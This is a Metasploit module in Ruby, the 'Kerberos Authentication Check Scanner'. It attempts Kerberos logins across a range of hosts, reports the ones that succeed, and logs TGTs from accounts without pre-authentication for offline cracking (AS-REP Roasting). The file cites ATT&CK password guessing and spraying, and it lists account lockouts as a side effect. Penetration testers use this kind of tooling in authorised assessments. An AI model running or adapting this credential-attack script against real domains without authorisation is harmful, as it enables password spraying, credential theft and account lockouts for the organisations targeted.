##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ostruct'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::AuthBrute

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Authentication Check Scanner',
        'Description' => %q{
          This module will test Kerberos logins on a range of machines and
          report successful logins.

          Kerberos accounts which do not require pre-authentication will
          have the TGT logged for offline cracking (AS-REP Roasting).
        },
        'Author' => [
          'alanfoster',
        ],
        'References' => [
          ['ATT&CK', Mitre::Attack::Technique::T1110_001_PASSWORD_GUESSING],
          ['ATT&CK', Mitre::Attack::Technique::T1110_003_PASSWORD_SPRAYING],
          ['ATT&CK', Mitre::Attack::Technique::T1589_001_CREDENTIALS],
          ['ATT&CK', Mitre::Attack::Technique::T1087_002_DOMAIN_ACCOUNT]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [ACCOUNT_LOCKOUTS, IOC_IN_LOGS]
        }
      )
    )
  end

  def run
    attempt_kerberos_logins
  end

  # TRACE INTEGRATION
  def on_login_success(result)
    super

    return unless datastore['VERBOSE']
    return unless result.respond_to?(:proof) && result.proof

    response = OpenStruct.new(
      as_rep: result.proof,
      decrypted_part: nil
    )

    if defined?(Msf::Trace::KerberosTicketTrace)
      Msf::Trace::KerberosTicketTrace.print_metadata(response, self)
    end
  end
end
